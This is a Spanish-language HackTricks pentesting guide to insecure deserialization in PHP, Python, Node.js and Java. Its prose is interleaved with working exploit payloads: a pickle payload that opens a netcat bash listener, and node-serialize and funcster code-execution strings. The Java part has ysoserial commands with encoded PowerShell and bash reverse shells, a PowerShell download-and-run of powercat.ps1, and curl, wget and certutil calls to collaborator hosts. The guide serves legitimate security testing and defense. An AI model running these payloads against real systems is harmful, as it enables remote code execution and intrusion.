# Deserializaci칩n

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="../../.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="../../.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="../../.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 游눫 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informaci칩n B치sica

**La serializaci칩n** se entiende como el m칠todo de convertir un objeto en un formato que puede ser preservado, con la intenci칩n de almacenar el objeto o transmitirlo como parte de un proceso de comunicaci칩n. Esta t칠cnica se emplea com칰nmente para asegurar que el objeto pueda ser recreado en un momento posterior, manteniendo su estructura y estado.

**La deserializaci칩n**, por el contrario, es el proceso que contrarresta la serializaci칩n. Implica tomar datos que han sido estructurados en un formato espec칤fico y reconstruirlos de nuevo en un objeto.

La deserializaci칩n puede ser peligrosa porque **potencialmente permite a los atacantes manipular los datos serializados para ejecutar c칩digo da침ino** o causar un comportamiento inesperado en la aplicaci칩n durante el proceso de reconstrucci칩n del objeto.

## PHP

En PHP, se utilizan m칠todos m치gicos espec칤ficos durante los procesos de serializaci칩n y deserializaci칩n:

* `__sleep`: Invocado cuando un objeto est치 siendo serializado. Este m칠todo debe devolver un array con los nombres de todas las propiedades del objeto que deben ser serializadas. Se utiliza com칰nmente para comprometer datos pendientes o realizar tareas de limpieza similares.
* `__wakeup`: Llamado cuando un objeto est치 siendo deserializado. Se utiliza para restablecer cualquier conexi칩n a la base de datos que pueda haberse perdido durante la serializaci칩n y realizar otras tareas de reinicializaci칩n.
* `__unserialize`: Este m칠todo se llama en lugar de `__wakeup` (si existe) cuando un objeto est치 siendo deserializado. Ofrece m치s control sobre el proceso de deserializaci칩n en comparaci칩n con `__wakeup`.
* `__destruct`: Este m칠todo se llama cuando un objeto est치 a punto de ser destruido o cuando el script termina. Se utiliza t칤picamente para tareas de limpieza, como cerrar manejadores de archivos o conexiones a bases de datos.
* `__toString`: Este m칠todo permite que un objeto sea tratado como una cadena. Puede ser utilizado para leer un archivo u otras tareas basadas en las llamadas a funciones dentro de 칠l, proporcionando efectivamente una representaci칩n textual del objeto.
```php
<?php
class test {
public $s = "This is a test";
public function displaystring(){
echo $this->s.'<br />';
}
public function __toString()
{
echo '__toString method called';
}
public function __construct(){
echo "__construct method called";
}
public function __destruct(){
echo "__destruct method called";
}
public function __wakeup(){
echo "__wakeup method called";
}
public function __sleep(){
echo "__sleep method called";
return array("s"); #The "s" makes references to the public attribute
}
}

$o = new test();
$o->displaystring();
$ser=serialize($o);
echo $ser;
$unser=unserialize($ser);
$unser->displaystring();

/*
php > $o = new test();
__construct method called
__destruct method called
php > $o->displaystring();
This is a test<br />

php > $ser=serialize($o);
__sleep method called

php > echo $ser;
O:4:"test":1:{s:1:"s";s:14:"This is a test";}

php > $unser=unserialize($ser);
__wakeup method called
__destruct method called

php > $unser->displaystring();
This is a test<br />
*/
?>
```
Si miras los resultados, puedes ver que las funciones **`__wakeup`** y **`__destruct`** se llaman cuando el objeto es deserializado. Ten en cuenta que en varios tutoriales encontrar치s que la funci칩n **`__toString`** se llama al intentar imprimir alg칰n atributo, pero aparentemente eso **ya no est치 sucediendo**.

{% hint style="warning" %}
El m칠todo **`__unserialize(array $data)`** se llama **en lugar de `__wakeup()`** si est치 implementado en la clase. Te permite deserializar el objeto proporcionando los datos serializados como un array. Puedes usar este m칠todo para deserializar propiedades y realizar cualquier tarea necesaria al deserializar.
```php
class MyClass {
private $property;

public function __unserialize(array $data): void {
$this->property = $data['property'];
// Perform any necessary tasks upon deserialization.
}
}
```
{% endhint %}

Puedes leer un **ejemplo de PHP explicado aqu칤**: [https://www.notsosecure.com/remote-code-execution-via-php-unserialize/](https://www.notsosecure.com/remote-code-execution-via-php-unserialize/), aqu칤 [https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf](https://www.exploit-db.com/docs/english/44756-deserialization-vulnerability.pdf) o aqu칤 [https://securitycafe.ro/2015/01/05/understanding-php-object-injection/](https://securitycafe.ro/2015/01/05/understanding-php-object-injection/)

### PHP Deserial + Autoload Classes

Podr칤as abusar de la funcionalidad de autoload de PHP para cargar archivos php arbitrarios y m치s:

{% content-ref url="php-deserialization-+-autoload-classes.md" %}
[php-deserialization-+-autoload-classes.md](php-deserialization-+-autoload-classes.md)
{% endcontent-ref %}

### Serializando Valores Referenciados

Si por alguna raz칩n deseas serializar un valor como una **referencia a otro valor serializado**, puedes:
```php
<?php
class AClass {
public $param1;
public $param2;
}

$o = new WeirdGreeting;
$o->param1 =& $o->param22;
$o->param = "PARAM";
$ser=serialize($o);
```
### PHPGGC (ysoserial para PHP)

[**PHPGGC**](https://github.com/ambionics/phpggc) puede ayudarte a generar payloads para abusar de las deserializaciones de PHP.\
Ten en cuenta que en varios casos **no podr치s encontrar una forma de abusar de una deserializaci칩n en el c칩digo fuente** de la aplicaci칩n, pero podr칤as **abusar del c칩digo de extensiones PHP externas.**\
As칤 que, si puedes, revisa el `phpinfo()` del servidor y **busca en internet** (e incluso en los **gadgets** de **PHPGGC**) algunos posibles gadgets que podr칤as abusar.

### deserializaci칩n de metadatos phar://

Si has encontrado un LFI que solo est치 leyendo el archivo y no ejecutando el c칩digo php dentro de 칠l, por ejemplo, usando funciones como _**file\_get\_contents(), fopen(), file() o file\_exists(), md5\_file(), filemtime() o filesize()**_**.** Puedes intentar abusar de una **deserializaci칩n** que ocurre al **leer** un **archivo** usando el protocolo **phar**.\
Para m치s informaci칩n, lee el siguiente post:

{% content-ref url="../file-inclusion/phar-deserialization.md" %}
[phar-deserialization.md](../file-inclusion/phar-deserialization.md)
{% endcontent-ref %}

## Python

### **Pickle**

Cuando el objeto se deserializa, se ejecutar치 la funci칩n _\_\_reduce\_\___.\
Cuando se explota, el servidor podr칤a devolver un error.
```python
import pickle, os, base64
class P(object):
def __reduce__(self):
return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
Antes de verificar la t칠cnica de bypass, intenta usar `print(base64.b64encode(pickle.dumps(P(),2)))` para generar un objeto que sea compatible con python2 si est치s ejecutando python3.

Para m치s informaci칩n sobre c칩mo escapar de **pickle jails** consulta:

{% content-ref url="../../generic-methodologies-and-resources/python/bypass-python-sandboxes/" %}
[bypass-python-sandboxes](../../generic-methodologies-and-resources/python/bypass-python-sandboxes/)
{% endcontent-ref %}

### Yaml **&** jsonpickle

La siguiente p치gina presenta la t칠cnica para **abusar de una deserializaci칩n insegura en bibliotecas de yamls** de python y termina con una herramienta que se puede usar para generar cargas 칰tiles de deserializaci칩n RCE para **Pickle, PyYAML, jsonpickle y ruamel.yaml**:

{% content-ref url="python-yaml-deserialization.md" %}
[python-yaml-deserialization.md](python-yaml-deserialization.md)
{% endcontent-ref %}

### Contaminaci칩n de Clases (Contaminaci칩n de Prototipos de Python)

{% content-ref url="../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md" %}
[class-pollution-pythons-prototype-pollution.md](../../generic-methodologies-and-resources/python/class-pollution-pythons-prototype-pollution.md)
{% endcontent-ref %}

## NodeJS

### Funciones M치gicas de JS

JS **no tiene funciones "m치gicas"** como PHP o Python que se ejecutan solo por crear un objeto. Pero tiene algunas **funciones** que son **frecuentemente utilizadas incluso sin ser llamadas directamente** como **`toString`**, **`valueOf`**, **`toJSON`**.\
Si abusas de una deserializaci칩n, puedes **comprometer estas funciones para ejecutar otro c칩digo** (potencialmente abusando de contaminaciones de prototipos) podr칤as ejecutar c칩digo arbitrario cuando sean llamadas.

Otra **manera "m치gica" de llamar a una funci칩n** sin llamarla directamente es **comprometiendo un objeto que es devuelto por una funci칩n as칤ncrona** (promesa). Porque, si **transformas** ese **objeto de retorno** en otra **promesa** con una **propiedad** llamada **"then" de tipo funci칩n**, ser치 **ejecutado** solo porque es devuelto por otra promesa. _Sigue_ [_**este enlace**_](https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/) _para m치s informaci칩n._
```javascript
// If you can compromise p (returned object) to be a promise
// it will be executed just because it's the return object of an async function:
async function test_resolve() {
const p = new Promise(resolve => {
console.log('hello')
resolve()
})
return p
}

async function test_then() {
const p = new Promise(then => {
console.log('hello')
return 1
})
return p
}

test_ressolve()
test_then()
//For more info: https://blog.huli.tw/2022/07/11/en/googlectf-2022-horkos-writeup/
```
### `__proto__` y contaminaci칩n de `prototype`

Si quieres aprender sobre esta t칠cnica **echa un vistazo al siguiente tutorial**:

{% content-ref url="nodejs-proto-prototype-pollution/" %}
[nodejs-proto-prototype-pollution](nodejs-proto-prototype-pollution/)
{% endcontent-ref %}

### [node-serialize](https://www.npmjs.com/package/node-serialize)

Esta biblioteca permite serializar funciones. Ejemplo:
```javascript
var y = {
"rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```
El **objeto serializado** se ver치 as칤:
```bash
{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}
```
Puedes ver en el ejemplo que cuando una funci칩n es serializada, la bandera `_$$ND_FUNC$$_` se a침ade al objeto serializado.

Dentro del archivo `node-serialize/lib/serialize.js` puedes encontrar la misma bandera y c칩mo el c칩digo la est치 utilizando.

![](<../../.gitbook/assets/image (351).png>)

![](<../../.gitbook/assets/image (446).png>)

Como puedes ver en el 칰ltimo fragmento de c칩digo, **si se encuentra la bandera**, se utiliza `eval` para deserializar la funci칩n, as칤 que b치sicamente **la entrada del usuario se est치 utilizando dentro de la funci칩n `eval`**.

Sin embargo, **simplemente serializar** una funci칩n **no la ejecutar치**, ya que ser칤a necesario que alguna parte del c칩digo **llame a `y.rce`** en nuestro ejemplo y eso es altamente **improbable**.\
De todos modos, podr칤as **modificar el objeto serializado** **agregando algunos par칠ntesis** para que la funci칩n serializada se ejecute autom치ticamente cuando el objeto sea deserializado.\
En el siguiente fragmento de c칩digo **nota el 칰ltimo par칠ntesis** y c칩mo la funci칩n `unserialize` ejecutar치 autom치ticamente el c칩digo:
```javascript
var serialize = require('node-serialize');
var test = {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"};
serialize.unserialize(test);
```
Como se indic칩 anteriormente, esta biblioteca obtendr치 el c칩digo despu칠s de `_$$ND_FUNC$$_` y **lo ejecutar치** usando `eval`. Por lo tanto, para **auto-ejecutar c칩digo** puedes **eliminar la parte de creaci칩n de la funci칩n** y el 칰ltimo par칠ntesis y **simplemente ejecutar un oneliner de JS** como en el siguiente ejemplo:
```javascript
var serialize = require('node-serialize');
var test = '{"rce":"_$$ND_FUNC$$_require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) })"}';
serialize.unserialize(test);
```
Puedes [**encontrar aqu칤**](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/) **m치s informaci칩n** sobre c칩mo explotar esta vulnerabilidad.

### [funcster](https://www.npmjs.com/package/funcster)

Un aspecto notable de **funcster** es la inaccesibilidad de **los objetos incorporados est치ndar**; quedan fuera del alcance accesible. Esta restricci칩n impide la ejecuci칩n de c칩digo que intente invocar m칠todos en objetos incorporados, lo que lleva a excepciones como `"ReferenceError: console is not defined"` cuando se utilizan comandos como `console.log()` o `require(something)`.

A pesar de esta limitaci칩n, es posible restaurar el acceso completo al contexto global, incluidos todos los objetos incorporados est치ndar, a trav칠s de un enfoque espec칤fico. Al aprovechar el contexto global directamente, se puede eludir esta restricci칩n. Por ejemplo, el acceso se puede restablecer utilizando el siguiente fragmento:
```javascript
funcster = require("funcster");
//Serialization
var test = funcster.serialize(function() { return "Hello world!" })
console.log(test) // { __js_function: 'function(){return"Hello world!"}' }

//Deserialization with auto-execution
var desertest1 = { __js_function: 'function(){return "Hello world!"}()' }
funcster.deepDeserialize(desertest1)
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)
var desertest3 = { __js_function: 'this.constructor.constructor("require(\'child_process\').exec(\'ls /\', function(error, stdout, stderr) { console.log(stdout) });")()' }
funcster.deepDeserialize(desertest3)
```
**Para**[ **m치s informaci칩n, lea esta fuente**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### [**serialize-javascript**](https://www.npmjs.com/package/serialize-javascript)

El paquete **serialize-javascript** est치 dise침ado exclusivamente para fines de serializaci칩n, careciendo de cualquier capacidad de deserializaci칩n incorporada. Los usuarios son responsables de implementar su propio m칠todo para la deserializaci칩n. Se sugiere un uso directo de `eval` en el ejemplo oficial para deserializar datos serializados:
```javascript
function deserialize(serializedJavascript){
return eval('(' + serializedJavascript + ')');
}
```
Si esta funci칩n se utiliza para deserializar objetos, puedes **explotarlo f치cilmente**:
```javascript
var serialize = require('serialize-javascript');
//Serialization
var test = serialize(function() { return "Hello world!" });
console.log(test) //function() { return "Hello world!" }

//Deserialization
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```
**Para**[ **m치s informaci칩n, lea esta fuente**](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)**.**

### Biblioteca Cryo

En las siguientes p치ginas puedes encontrar informaci칩n sobre c칩mo abusar de esta biblioteca para ejecutar comandos arbitrarios:

* [https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/](https://www.acunetix.com/blog/web-security-zone/deserialization-vulnerabilities-attacking-deserialization-in-js/)
* [https://hackerone.com/reports/350418](https://hackerone.com/reports/350418)

## Java - HTTP

En Java, **los callbacks de deserializaci칩n se ejecutan durante el proceso de deserializaci칩n**. Esta ejecuci칩n puede ser explotada por atacantes que crean cargas 칰tiles maliciosas que activan estos callbacks, lo que lleva a la posible ejecuci칩n de acciones da침inas.

### Huellas dactilares

#### Caja blanca

Para identificar posibles vulnerabilidades de serializaci칩n en la base de c칩digo, busca:

* Clases que implementen la interfaz `Serializable`.
* Uso de `java.io.ObjectInputStream`, funciones `readObject`, `readUnshared`.

Presta especial atenci칩n a:

* `XMLDecoder` utilizado con par치metros definidos por usuarios externos.
* El m칠todo `fromXML` de `XStream`, especialmente si la versi칩n de XStream es menor o igual a 1.46, ya que es susceptible a problemas de serializaci칩n.
* `ObjectInputStream` acoplado con el m칠todo `readObject`.
* Implementaci칩n de m칠todos como `readObject`, `readObjectNodData`, `readResolve` o `readExternal`.
* `ObjectInputStream.readUnshared`.
* Uso general de `Serializable`.

#### Caja negra

Para pruebas de caja negra, busca **firmas espec칤ficas o "Bytes M치gicos"** que denoten objetos serializados de Java (originados de `ObjectInputStream`):

* Patr칩n hexadecimal: `AC ED 00 05`.
* Patr칩n Base64: `rO0`.
* Encabezados de respuesta HTTP con `Content-type` establecido en `application/x-java-serialized-object`.
* Patr칩n hexadecimal que indica compresi칩n previa: `1F 8B 08 00`.
* Patr칩n Base64 que indica compresi칩n previa: `H4sIA`.
* Archivos web con la extensi칩n `.faces` y el par치metro `faces.ViewState`. Descubrir estos patrones en una aplicaci칩n web deber칤a provocar un examen como se detalla en el [post sobre la deserializaci칩n de Java JSF ViewState](java-jsf-viewstate-.faces-deserialization.md).
```
javax.faces.ViewState=rO0ABXVyABNbTGphdmEubGFuZy5PYmplY3Q7kM5YnxBzKWwCAAB4cAAAAAJwdAAML2xvZ2luLnhodG1s
```
### Verificar si es vulnerable

Si quieres **aprender c칩mo funciona un exploit de deserializaci칩n en Java**, deber칤as echar un vistazo a [**Deserializaci칩n B치sica en Java**](basic-java-deserialization-objectinputstream-readobject.md), [**Deserializaci칩n DNS en Java**](java-dns-deserialization-and-gadgetprobe.md), y [**Carga 칔til de CommonsCollection1**](java-transformers-to-rutime-exec-payload.md).

#### Prueba de Caja Blanca

Puedes verificar si hay alguna aplicaci칩n instalada con vulnerabilidades conocidas.
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Podr칤as intentar **verificar todas las bibliotecas** conocidas por ser vulnerables y que [**Ysoserial**](https://github.com/frohoff/ysoserial) puede proporcionar un exploit. O podr칤as revisar las bibliotecas indicadas en [Java-Deserialization-Cheat-Sheet](https://github.com/GrrrDog/Java-Deserialization-Cheat-Sheet#genson-json).\
Tambi칠n podr칤as usar [**gadgetinspector**](https://github.com/JackOfMostTrades/gadgetinspector) para buscar posibles cadenas de gadgets que puedan ser explotadas.\
Al ejecutar **gadgetinspector** (despu칠s de construirlo) no te preocupes por las toneladas de advertencias/errores que est치 generando y d칠jalo terminar. Escribir치 todos los hallazgos en _gadgetinspector/gadget-results/gadget-chains-a침o-mes-d칤a-hora-min.txt_. Por favor, ten en cuenta que **gadgetinspector no crear치 un exploit y puede indicar falsos positivos**.

#### Prueba de Caja Negra

Usando la extensi칩n de Burp [**gadgetprobe**](java-dns-deserialization-and-gadgetprobe.md) puedes identificar **qu칠 bibliotecas est치n disponibles** (e incluso las versiones). Con esta informaci칩n podr칤a ser **m치s f치cil elegir un payload** para explotar la vulnerabilidad.\
[**Lee esto para aprender m치s sobre GadgetProbe**](java-dns-deserialization-and-gadgetprobe.md#gadgetprobe)**.**\
GadgetProbe se centra en **deserializaciones de `ObjectInputStream`**.

Usando la extensi칩n de Burp [**Java Deserialization Scanner**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner) puedes **identificar bibliotecas vulnerables** explotables con ysoserial y **explotarlas**.\
[**Lee esto para aprender m치s sobre Java Deserialization Scanner.**](java-dns-deserialization-and-gadgetprobe.md#java-deserialization-scanner)\
Java Deserialization Scanner se centra en **deserializaciones de `ObjectInputStream`**.

Tambi칠n puedes usar [**Freddy**](https://github.com/nccgroup/freddy) para **detectar vulnerabilidades de deserializaci칩n** en **Burp**. Este plugin detectar치 **no solo vulnerabilidades relacionadas con `ObjectInputStream`** sino **tambi칠n** vulnerabilidades de bibliotecas de deserializaci칩n de **Json** y **Yml**. En modo activo, intentar치 confirmarlas usando payloads de sleep o DNS.\
[**Puedes encontrar m치s informaci칩n sobre Freddy aqu칤.**](https://www.nccgroup.com/us/about-us/newsroom-and-events/blog/2018/june/finding-deserialisation-issues-has-never-been-easier-freddy-the-serialisation-killer/)

**Prueba de Serializaci칩n**

No todo se trata de verificar si alguna biblioteca vulnerable es utilizada por el servidor. A veces podr칤as ser capaz de **cambiar los datos dentro del objeto serializado y eludir algunas verificaciones** (quiz치s otorg치ndote privilegios de administrador dentro de una webapp).\
Si encuentras un objeto serializado de java siendo enviado a una aplicaci칩n web, **puedes usar** [**SerializationDumper**](https://github.com/NickstaDB/SerializationDumper) **para imprimir en un formato m치s legible para humanos el objeto de serializaci칩n que se env칤a**. Saber qu칠 datos est치s enviando facilitar칤a su modificaci칩n y eludir algunas verificaciones.

### **Explotar**

#### **ysoserial**

La herramienta principal para explotar deserializaciones de Java es [**ysoserial**](https://github.com/frohoff/ysoserial) ([**descargar aqu칤**](https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar)). Tambi칠n puedes considerar usar [**ysoseral-modified**](https://github.com/pimps/ysoserial-modified) que te permitir치 usar comandos complejos (con pipes, por ejemplo).\
Ten en cuenta que esta herramienta est치 **enfocada** en explotar **`ObjectInputStream`**.\
Yo **comenzar칤a usando el payload "URLDNS"** **antes de un payload RCE** para probar si la inyecci칩n es posible. De todos modos, ten en cuenta que tal vez el payload "URLDNS" no funcione, pero otro payload RCE s칤.
```bash
# PoC to make the application perform a DNS req
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://b7j40108s43ysmdpplgd3b7rdij87x.burpcollaborator.net > payload

# PoC RCE in Windows
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
# Time, I noticed the response too longer when this was used
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
# Create File
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\\\Users\\\\username\\\\pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup jvikwa34jwgftvoxdz16jhpufllb90.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://j4ops7g6mi9w30verckjrk26txzqnf.burpcollaborator.net/a a"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAYwBlADcAMABwAG8AbwB1ADAAaABlAGIAaQAzAHcAegB1AHMAMQB6ADIAYQBvADEAZgA3ADkAdgB5AC4AYgB1AHIAcABjAG8AbABsAGEAYgBvAHIAYQB0AG8AcgAuAG4AZQB0AC8AYQAnACkA"
## In the ast http request was encoded: IEX(New-Object Net.WebClient).downloadString('http://1ce70poou0hebi3wzus1z2ao1f79vy.burpcollaborator.net/a')
## To encode something in Base64 for Windows PS from linux you can use: echo -n "<PAYLOAD>" | iconv --to-code UTF-16LE | base64 -w0
# Reverse Shell
## Encoded: IEX(New-Object Net.WebClient).downloadString('http://192.168.1.4:8989/powercat.ps1')
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4ANAA6ADgAOQA4ADkALwBwAG8AdwBlAHIAYwBhAHQALgBwAHMAMQAnACkA"

#PoC RCE in Linux
# Ping
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
# Time
## Using time in bash I didn't notice any difference in the timing of the response
# Create file
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
# DNS request
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "nslookup ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# HTTP request (+DNS)
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "wget ftcwoztjxibkocen6mkck0ehs8yymn.burpcollaborator.net"
# Reverse shell
## Encoded: bash -i >& /dev/tcp/127.0.0.1/4444 0>&1
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvNDQ0NCAwPiYx}|{base64,-d}|{bash,-i}" | base64 -w0
## Encoded: export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,ZXhwb3J0IFJIT1NUPSIxMjcuMC4wLjEiO2V4cG9ydCBSUE9SVD0xMjM0NTtweXRob24gLWMgJ2ltcG9ydCBzeXMsc29ja2V0LG9zLHB0eTtzPXNvY2tldC5zb2NrZXQoKTtzLmNvbm5lY3QoKG9zLmdldGVudigiUkhPU1QiKSxpbnQob3MuZ2V0ZW52KCJSUE9SVCIpKSkpO1tvcy5kdXAyKHMuZmlsZW5vKCksZmQpIGZvciBmZCBpbiAoMCwxLDIpXTtwdHkuc3Bhd24oIi9iaW4vc2giKSc=}|{base64,-d}|{bash,-i}"

# Base64 encode payload in base64
base64 -w0 payload
```
Cuando se crea una carga 칰til para **java.lang.Runtime.exec()** no **se pueden usar caracteres especiales** como ">" o "|" para redirigir la salida de una ejecuci칩n, "$()" para ejecutar comandos o incluso **pasar argumentos** a un comando separados por **espacios** (puedes hacer `echo -n "hello world"` pero no puedes hacer `python2 -c 'print "Hello world"'`). Para codificar correctamente la carga 칰til, podr칤as [usar esta p치gina web](http://www.jackson-t.ca/runtime-exec-payloads.html).

Si칠ntete libre de usar el siguiente script para crear **todas las posibles cargas 칰tiles de ejecuci칩n de c칩digo** para Windows y Linux y luego probarlas en la p치gina web vulnerable:
```python
import os
import base64

# You may need to update the payloads
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', 'CommonsCollections2', 'CommonsCollections3', 'CommonsCollections4', 'CommonsCollections5', 'CommonsCollections6', 'CommonsCollections7', 'Groovy1', 'Hibernate1', 'Hibernate2', 'JBossInterceptors1', 'JRMPClient', 'JSON1', 'JavassistWeld1', 'Jdk7u21', 'MozillaRhino1', 'MozillaRhino2', 'Myfaces1', 'Myfaces2', 'ROME', 'Spring1', 'Spring2', 'Vaadin1', 'Wicket1']
def generate(name, cmd):
for payload in payloads:
final = cmd.replace('REPLACE', payload)
print 'Generating ' + payload + ' for ' + name + '...'
command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + final + '"')
result = command.read()
command.close()
encoded = base64.b64encode(result)
if encoded != "":
open(name + '_intruder.txt', 'a').write(encoded + '\n')

generate('Windows', 'ping -n 1 win.REPLACE.server.local')
generate('Linux', 'ping -c 1 nix.REPLACE.server.local')
```
#### serialkillerbypassgadgets

Puedes **usar** [**https://github.com/pwntester/SerialKillerBypassGadgetCollection**](https://github.com/pwntester/SerialKillerBypassGadgetCollection) **junto con ysoserial para crear m치s exploits**. M치s informaci칩n sobre esta herramienta en las **diapositivas de la charla** donde se present칩 la herramienta: [https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1](https://es.slideshare.net/codewhitesec/java-deserialization-vulnerabilities-the-forgotten-bug-class?next\_slideshow=1)

#### marshalsec

[**marshalsec** ](https://github.com/mbechler/marshalsec) se puede usar para generar payloads para explotar diferentes **Json** y **Yml** bibliotecas de serializaci칩n en Java.\
Para compilar el proyecto, necesitaba **agregar** estas **dependencias** a `pom.xml`:
```markup
<dependency>
<groupId>javax.activation</groupId>
<artifactId>activation</artifactId>
<version>1.1.1</version>
</dependency>

<dependency>
<groupId>com.sun.jndi</groupId>
<artifactId>rmiregistry</artifactId>
<version>1.2.1</version>
<type>pom</type>
</dependency>
```
**Instala maven**, y **compila** el proyecto:
```bash
sudo apt-get install maven
mvn clean package -DskipTests
```
#### FastJSON

Lee m치s sobre esta biblioteca Java JSON: [https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html](https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html)

### Labs

* Si quieres probar algunos payloads de ysoserial, puedes **ejecutar esta webapp**: [https://github.com/hvqzao/java-deserialize-webapp](https://github.com/hvqzao/java-deserialize-webapp)
* [https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/](https://diablohorn.com/2017/09/09/understanding-practicing-java-deserialization-exploits/)

### Why

Java utiliza mucha serializaci칩n para varios prop칩sitos como:

* **Solicitudes HTTP**: La serializaci칩n se emplea ampliamente en la gesti칩n de par치metros, ViewState, cookies, etc.
* **RMI (Invocaci칩n de M칠todos Remotos)**: El protocolo RMI de Java, que se basa completamente en la serializaci칩n, es una piedra angular para la comunicaci칩n remota en aplicaciones Java.
* **RMI sobre HTTP**: Este m칠todo es com칰nmente utilizado por aplicaciones web de cliente grueso basadas en Java, utilizando la serializaci칩n para todas las comunicaciones de objetos.
* **JMX (Extensiones de Gesti칩n de Java)**: JMX utiliza la serializaci칩n para transmitir objetos a trav칠s de la red.
* **Protocolos Personalizados**: En Java, la pr치ctica est치ndar implica la transmisi칩n de objetos Java en bruto, lo que se demostrar치 en ejemplos de explotaci칩n pr칩ximos.

### Prevention

#### Objetos transitorios

Una clase que implementa `Serializable` puede implementar como `transient` cualquier objeto dentro de la clase que no deber칤a ser serializable. Por ejemplo:
```java
public class myAccount implements Serializable
{
private transient double profit; // declared transient
private transient double margin; // declared transient
```
#### Evitar la serializaci칩n de una clase que necesita implementar Serializable

